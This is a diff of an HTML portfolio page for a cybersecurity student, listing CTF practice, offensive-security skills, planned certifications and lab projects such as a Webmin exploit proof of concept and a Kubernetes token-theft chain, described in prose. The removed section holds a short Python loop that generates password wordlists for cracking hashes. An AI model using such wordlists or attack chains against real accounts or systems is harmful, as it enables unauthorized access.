-        <p>Completed multiple CTF boxes including <strong>Simple CTF</strong>, <strong>LazyAdmin</strong>, <strong>Blue</strong>, <strong>Archetype</strong>, <strong>Carnage</strong> (Wireshark forensics), <strong>Dirty Pipe</strong>, <strong>Breakme</strong>, and <strong>Publisher</strong>.</p>
-      </div>
-
-      <div class="project-card">
-        <div class="project-icon"><i class="fas fa-tools"></i></div>
-        <h3>Wordlist & Payload Generators</h3>
-        <div class="tech">
-          <span>Python</span><span>Automation</span><span>Hashcat</span>
-        </div>
-        <p>Wrote Python scripts to generate custom wordlists with case variations, @ separators, and 3–6 digit numbers. Used them with Hashcat and John to crack MD5 and SHA-256 hashes in CTF labs.</p>
-        <div class="code-line">
-          <span style="color:#557788;">for word in [kw, kw.upper(), kw.capitalize()]:</span><br>
-          <span style="color:#7b9fd4;">    for num in range(1000): print(f"&#123;word&#125;@&#123;num:03d&#125;")</span>
+        <div class="about-grid">
+          <div class="panel">
+            <p class="terminal-line">pratik@security:~$ <span>cat about.txt</span></p>
+            <p class="about-copy">I'm Pratik Adhikari, an aspiring cybersecurity professional currently completing my bachelor's degree while building hands-on offensive security skills outside the classroom. Since mid-2026 I've been living inside Kali and Parrot OS labs — enumerating services, breaking web applications, cracking hashes, and grinding through TryHackMe, HackTheBox, and OverTheWire boxes to turn theory into muscle memory.</p>
+            <p class="about-copy">In September 2026 I ran my first authorized, non-intrusive security assessment against a live production web platform, mapping its attack surface end-to-end and reporting real, verifiable findings with CVSS scoring and remediation guidance.</p>
+            <p class="about-copy">Right now I'm studying toward CEH, CompTIA PenTest+, and eJPT, and exploring bug bounty platforms like HackerOne to keep pushing my skills into real-world, high-stakes territory.</p>
+          </div>
+          <aside class="panel" aria-label="Current focus">
+            <p class="terminal-line">pratik@security:~$ <span>status --current</span></p>
+            <dl class="stat-list">
+              <div class="stat">
+                <dt>Primary focus</dt>
+                <dd>Web application security</dd>
+              </div>
+              <div class="stat">
+                <dt>Lab systems</dt>
+                <dd>Kali · Parrot · VirtualBox</dd>
+              </div>
+              <div class="stat">
+                <dt>Practice since</dt>
+                <dd>June 2026 · near-daily</dd>
+              </div>
+              <div class="stat">
+                <dt>Scope standard</dt>
+                <dd>Authorized and non-intrusive</dd>
+              </div>
+            </dl>
+          </aside>
         </div>
       </div>
+    </section>
 
-      <div class="project-card">
-        <div class="project-icon"><i class="fas fa-firewall"></i></div>
-        <h3>fail2ban Intrusion Prevention</h3>
-        <div class="tech">
-          <span>Security</span><span>iptables</span><span>Log Analysis</span>
+    <section class="section" id="skills">
+      <div class="shell">
+        <div class="section-heading">
+          <span class="section-number">02</span>
+          <h2>Skills</h2>
         </div>
-        <p>Configured fail2ban to monitor authentication logs and automatically block malicious IPs via iptables. Customized jail configurations for SSH and web services, reducing brute-force attack surface.</p>
+        <div class="rank-legend" aria-label="Rank legend">
+          <span class="legend-item legend-best">Best / hard work</span>
+          <span class="legend-item legend-medium">Medium effort</span>
+          <span class="legend-item legend-low">Low effort / quick task</span>
+        </div>
+        <div class="skill-grid">
+          <article class="rank-card rank-best skill-group">
+            <span class="rank-badge">best</span>
+            <h3>Web App Pentesting</h3>
+            <div class="tags">
+              <span class="tag">SQL Injection</span><span class="tag">Blind SQLi</span><span class="tag">XSS</span><span class="tag">IDOR</span><span class="tag">XXE</span><span class="tag">SSRF</span><span class="tag">NoSQL Injection</span><span class="tag">Race Conditions</span><span class="tag">Prototype Pollution</span><span class="tag">GraphQL Abuse</span><span class="tag">Clickjacking</span><span class="tag">Request Smuggling</span>
+            </div>
+          </article>
+          <article class="rank-card rank-best skill-group">
+            <span class="rank-badge">best</span>
+            <h3>Exploitation &amp; Tooling</h3>
+            <div class="tags">
+              <span class="tag">Burp Suite</span><span class="tag">SQLMap</span><span class="tag">Metasploit</span><span class="tag">Gobuster</span><span class="tag">ffuf</span><span class="tag">Dirsearch</span><span class="tag">Hydra</span><span class="tag">Hashcat</span><span class="tag">Nuclei</span><span class="tag">BloodyAD</span>
+            </div>
+          </article>
+          <article class="rank-card rank-medium skill-group">
+            <span class="rank-badge">medium</span>
+            <h3>Recon &amp; OSINT</h3>
+            <div class="tags">
+              <span class="tag">Nmap</span><span class="tag">Subfinder</span><span class="tag">httpx</span><span class="tag">Katana</span><span class="tag">Sublist3r</span><span class="tag">crt.sh</span><span class="tag">Shodan CLI</span><span class="tag">Wayback URLs</span>
+            </div>
+          </article>
+          <article class="rank-card rank-medium skill-group">
+            <span class="rank-badge">medium</span>
+            <h3>Network &amp; Active Directory</h3>
+            <div class="tags">
+              <span class="tag">AD Enumeration</span><span class="tag">Golden Ticket Concepts</span><span class="tag">SMB / FTP / SSH Enum</span><span class="tag">Privilege Escalation</span><span class="tag">LOLBins</span>
+            </div>
+          </article>
+          <article class="rank-card rank-low skill-group">
+            <span class="rank-badge">low</span>
+            <h3>Systems &amp; Scripting</h3>
+            <div class="tags">
+              <span class="tag">Linux (Kali / Parrot)</span><span class="tag">Bash</span><span class="tag">Python (PoC scripting)</span><span class="tag">VirtualBox Labs</span>
+            </div>
+          </article>
+          <article class="rank-card rank-low skill-group">
+            <span class="rank-badge">low</span>
+            <h3>Cloud, GRC &amp; Threat Ops</h3>
+            <div class="tags">
+              <span class="tag">Azure CLI Basics</span><span class="tag">Cloud Security Groups</span><span class="tag">CIS Benchmarks</span><span class="tag">Threat Intelligence</span><span class="tag">Threat Hunting</span><span class="tag">SOC Workflow</span>
+            </div>
+          </article>
+        </div>
       </div>
+    </section>
 
-    </div>
-  </section>
-
-  <!-- ===== TOOLCHAIN ===== -->
-  <section>
-    <div class="section-header">
-      <i class="fas fa-terminal"></i>
-      <h2>Toolchain</h2>
-      <div class="line"></div>
-    </div>
-    <div class="toolchain">
-      <span class="tag">Kali Linux</span>
-      <span class="tag">Ubuntu Server</span>
-      <span class="tag">Nmap</span>
-      <span class="tag">Metasploit</span>
-      <span class="tag">Burp Suite</span>
-      <span class="tag">SQLMap</span>
-      <span class="tag">Hashcat</span>
-      <span class="tag">John the Ripper</span>
-      <span class="tag">Hydra</span>
-      <span class="tag">Wireshark</span>
-      <span class="tag">tcpdump</span>
-      <span class="tag">WireGuard</span>
-      <span class="tag">iptables</span>
-      <span class="tag">fail2ban</span>
-      <span class="tag">Python 3</span>
-      <span class="tag">Bash</span>
-      <span class="tag">VirtualBox</span>
-      <span class="tag">Git</span>
-    </div>
-  </section>
-
-  <!-- ===== CONTACT ===== -->
-  <section>
-    <div class="section-header">
-      <i class="fas fa-paper-plane"></i>
-      <h2>Connect</h2>
-      <div class="line"></div>
-    </div>
-    <div class="contact-card">
-      <p>Open to security internships, junior pentesting roles, and CTF collaborations.</p>
-      <div class="contact-links">
-        <a href="mailto:apratik280@gmail.com"><i class="fas fa-envelope"></i> apratik280@gmail.com</a>
-        <a href="#"><i class="fab fa-github"></i> github.com/apratik</a>
-        <a href="#"><i class="fab fa-linkedin"></i> /in/pratik-adhikari</a>
+    <section class="section" id="certifications">
+      <div class="shell">
+        <div class="section-heading">
+          <span class="section-number">03</span>
+          <h2>Certifications</h2>
+        </div>
+        <p class="lede">Actively studying toward the following — this section will update as each is completed.</p>
+        <div class="cert-grid">
+          <article class="rank-card rank-best cert-card">
+            <span class="rank-badge">best</span>
+            <h3>Certified Ethical Hacker (CEH)</h3>
+            <p class="muted">Issuer: EC-Council</p>
+            <span class="cert-state">In Progress</span>
+          </article>
+          <article class="rank-card rank-best cert-card">
+            <span class="rank-badge">best</span>
+            <h3>CompTIA PenTest+</h3>
+            <p class="muted">Issuer: CompTIA</p>
+            <span class="cert-state">In Progress</span>
+          </article>
+          <article class="rank-card rank-medium cert-card">
+            <span class="rank-badge">medium</span>
+            <h3>CompTIA Network+</h3>
+            <p class="muted">Issuer: CompTIA</p>
+            <span class="cert-state">Studying</span>
+          </article>
+          <article class="rank-card rank-low cert-card">
+            <span class="rank-badge">low</span>
+            <h3>eJPT — Junior Penetration Tester</h3>
+            <p class="muted">Issuer: INE</p>
+            <span class="cert-state">Planned</span>
+          </article>
+        </div>
       </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- ===== FOOTER ===== -->
-  <footer class="footer">
-    <div class="terminal">
-      <span style="color:#557788;">$</span> echo "portfolio built from real hands-on sessions" <span class="blink">█</span>
+    <section class="section" id="journey">
+      <div class="shell">
+        <div class="section-heading">
+          <span class="section-number">04</span>
+          <h2>Learning &amp; Practice Journey</h2>
+        </div>
+        <div class="journey">
+          <article class="rank-card rank-best journey-card">
+            <div>
+              <div class="journey-date">September 2026</div>
+              <div class="journey-stage">Real-World Application</div>
+            </div>
+            <div>
+              <p>Completed the OverTheWire Natas web security wargame series.</p>
+              <p>Practiced professional report writing through a guided pentest-report QA exercise.</p>
+              <p>Explored bug bounty platforms — HackerOne VDPs, Hacker101 CTF, and Hacker Holidays.</p>
+              <p>Planned and executed a fully authorized, non-intrusive security assessment of a live production web platform.</p>
+            </div>
+            <span class="rank-badge">best</span>
+          </article>
+          <article class="rank-card rank-medium journey-card">
+            <div>
+              <div class="journey-date">August 2026</div>
+              <div class="journey-stage">Advanced Web Exploitation</div>
+            </div>
+            <div>
+              <p>Worked through labs on HTTP request smuggling, GraphQL introspection bypass, prototype pollution, race conditions, and XXE.</p>
+              <p>Solved SUID privilege escalation and buffer overflow challenges.</p>
+              <p>Drafted a personal cybersecurity CV and career roadmap.</p>
+            </div>
+            <span class="rank-badge">medium</span>
+          </article>
+          <article class="rank-card rank-medium journey-card">
+            <div>
+              <div class="journey-date">July 2026</div>
+              <div class="journey-stage">Building Momentum</div>
+            </div>
+            <div>
+              <p>Explored CMS vulnerabilities (SweetRice, Bolt CMS) and Apache / Tomcat misconfigurations.</p>
+              <p>Practiced password attacks with RockYou wordlists and Hashcat.</p>
+              <p>Began structured study of CEH material and mapped out a personal cybersecurity roadmap.</p>
+              <p>Started researching Active Directory attack chains and cloud security group fundamentals.</p>
+            </div>
+            <span class="rank-badge">medium</span>
+          </article>
+          <article class="rank-card rank-low journey-card">
+            <div>
+              <div class="journey-date">June 2026</div>
+              <div class="journey-stage">Foundations</div>
+            </div>
+            <div>
+              <p>Set up a Kali Linux lab environment on VirtualBox.</p>
+              <p>Completed first CTF rooms (Simple CTF) and core enumeration workflows with Nmap and Gobuster.</p>
+              <p>Practiced early web exploitation and CVE research, including vsftpd backdoor and CVE-2019-18634.</p>
+            </div>
+            <span class="rank-badge">low</span>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="projects">
+      <div class="shell">
+        <div class="section-heading">
+          <span class="section-number">05</span>
+          <h2>Projects &amp; Engagements</h2>
+        </div>
+        <div class="card-grid">
+          <article class="rank-card rank-best project-card">
+            <span class="rank-badge">best</span>
+            <h3>Authorized Web Platform Security Assessment</h3>
+            <p class="label">High Finding</p>
+            <p>Ran a scoped, non-intrusive black-box assessment against a live production EdTech platform and its subdomains, under signed written authorization limited to discovery only — no exploitation, no DoS, no data modification. Client identity withheld under confidentiality.</p>
+            <p class="label">Tools</p>
+            <div class="tags"><span class="tag">subfinder</span><span class="tag">crt.sh</span><span class="tag">katana</span><span class="tag">httpx</span><span class="tag">gobuster</span><span class="tag">nuclei</span><span class="tag">curl / openssl</span></div>
+            <p class="label">Outcome</p>
+            <p>Found a publicly exposed OpenAPI spec revealing 200+ endpoints (High), an internal dev-server URL leak, and a subdomain bypassing the CDN/WAF by serving direct from origin (Medium). Verified 39+ admin and tenant endpoints were correctly protected and confirmed CORS was safely configured. Delivered a severity-rated findings table with remediation guidance.</p>
+          </article>
+
+          <article class="rank-card rank-medium project-card">
+            <span class="rank-badge">medium</span>
+            <h3>Exploit Development — Webmin RCE PoC</h3>
+            <p class="label">Practice</p>
+            <p>Translated a public Metasploit module for CVE-2012-2982 (Webmin authenticated command injection) into a standalone Python proof-of-concept, handling session authentication and payload delivery manually.</p>
+            <p class="label">Tools</p>
+            <div class="tags"><span class="tag">Python</span><span class="tag">Webmin lab</span><span class="tag">Metasploit (reference)</span></div>
+            <p class="label">Outcome</p>
+            <p>Built a working end-to-end PoC script as part of a guided exploit-development exercise, translating an existing Ruby module into custom Python.</p>
+          </article>
+
+          <article class="rank-card rank-medium project-card">
+            <span class="rank-badge">medium</span>
+            <h3>Kubernetes Attack Path (Insekube)</h3>
+            <p class="label">Practice</p>
+            <p>Chained a command-injection foothold in a vulnerable web app into a Kubernetes pod, then exploited a Grafana LFI (CVE-2021-43798) to steal a mounted service-account token.</p>
+            <p class="label">Tools</p>
+            <div class="tags"><span class="tag">Command Injection</span><span class="tag">Grafana LFI</span><span class="tag">Kubernetes API</span></div>
+            <p class="label">Outcome</p>
+            <p>Mapped a full initial-access-to-lateral-movement chain inside a containerized environment, from foothold to cluster pivot.</p>
+          </article>
+
+          <article class="rank-card rank-low project-card">
+            <span class="rank-badge">low</span>
+            <h3>CTF &amp; Wargame Track Record</h3>
+            <p class="label">Ongoing</p>
+            <p>Continuous practice across TryHackMe, HackTheBox, and OverTheWire, spanning web, network, and Active Directory-focused challenges.</p>
+            <p class="label">Highlights</p>
+            <ul>
+              <li>OverTheWire Natas series (Natas 6 → 17)</li>
+              <li>DarkZero, Watcher, CMSpit, SQHell, Brute Force Heroes, Battery</li>
+              <li>Kioptrix, Raven Security, ThunderCipher, AttackerKB</li>
+              <li>Sticker Shop, Petshop Pro, H1 Thermostat CTF</li>
+            </ul>
+          </article>
+
+          <article class="rank-card rank-low project-card">
+            <span class="rank-badge">low</span>
+            <h3>Bug Bounty &amp; Professional Reporting Practice</h3>
+            <p class="label">Ongoing</p>
+            <p>Studying live bug bounty programs and reporting standards through HackerOne program research, Hacker101 CTF challenges, and a TryHackMe pentest-report QA simulation.</p>
+            <p class="label">Outcome</p>
+            <p>Learned to write clear, professional vulnerability reports and to reason about VDP scope and rules of engagement before ever touching a target.</p>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="education">
+      <div class="shell">
+        <div class="section-heading">
+          <span class="section-number">06</span>
+          <h2>Education</h2>
+        </div>
+        <div class="education-grid">
+          <article class="rank-card rank-medium">
+            <span class="rank-badge">medium</span>
+            <h3 class="education-title">Bachelor's Degree — In Progress</h3>
+            <p class="muted">[Tribhuvan University /  Bachelor of Information Technology] · [2027]</p>
+          </article>
+          <article class="panel">
+            <p class="terminal-line">pratik@security:~$ <span>cat learning.log</span></p>
+            <p class="about-copy">Alongside formal study, building practical skills through self-directed cybersecurity training — CTFs, TryHackMe, HackTheBox, and OverTheWire — with roughly three months of intensive, near-daily hands-on practice since June 2026.</p>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section class="section" id="contact">
+      <div class="shell">
+        <div class="section-heading">
+          <span class="section-number">07</span>
+          <h2>Contact</h2>
+        </div>
+        <div class="contact-grid">
+          <div class="panel">
+            <p class="terminal-line">pratik@security:~$ <span>echo "open to opportunities"</span></p>
+            <p class="about-copy">Open to internships, junior SOC / pentesting roles, and bug bounty collaboration.</p>
+          </div>
+          <div class="panel">
+            <ul class="contact-list">
+              <li><span>mail --to pratik</span><span class="muted">[apratik280@gmail.com]</span></li>
+              <li><span>github --profile</span><span class="muted">[github.com/PratikA]</span></li>
+              <li><span>linkedin --connect</span><span class="muted">[/pratik-adhikari-7a622a2a9]</span></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <div class="shell">
+      <strong>root@pentester:~#</strong> cat /root/flag.txt<br>
+      <span>echo "built by Pratik Adhikari, from the ground up."</span>
     </div>
-    <p>&copy; 2026 Pratik Adhikari — Built from TryHackMe, HackTheBox & Kali Linux practice</p>
   </footer>
-
-</div>
-
-<!-- ===== PHOTO UPLOAD PREVIEW SCRIPT ===== -->
-<script>
-  const photoInput = document.getElementById('photoInput');
-  const photoPreview = document.getElementById('photoPreview');
-  const photoWrapper = document.getElementById('photoWrapper');
-
-  photoInput.addEventListener('change', function (e) {
-    const file = e.target.files[0];
-    if (file) {
-      const reader = new FileReader();
-      reader.onload = function (event) {
-        photoPreview.src = event.target.result;
-        photoPreview.style.display = 'block';
-        // hide the camera icon and text
-        photoWrapper.querySelector('i').style.display = 'none';
-        photoWrapper.querySelector('span').style.display = 'none';
-      };
-      reader.readAsDataURL(file);
-    }
-  });
-
-  // optional: click anywhere on the wrapper triggers input (already works because input is absolute)
-</script>
-
 </body>
 </html>
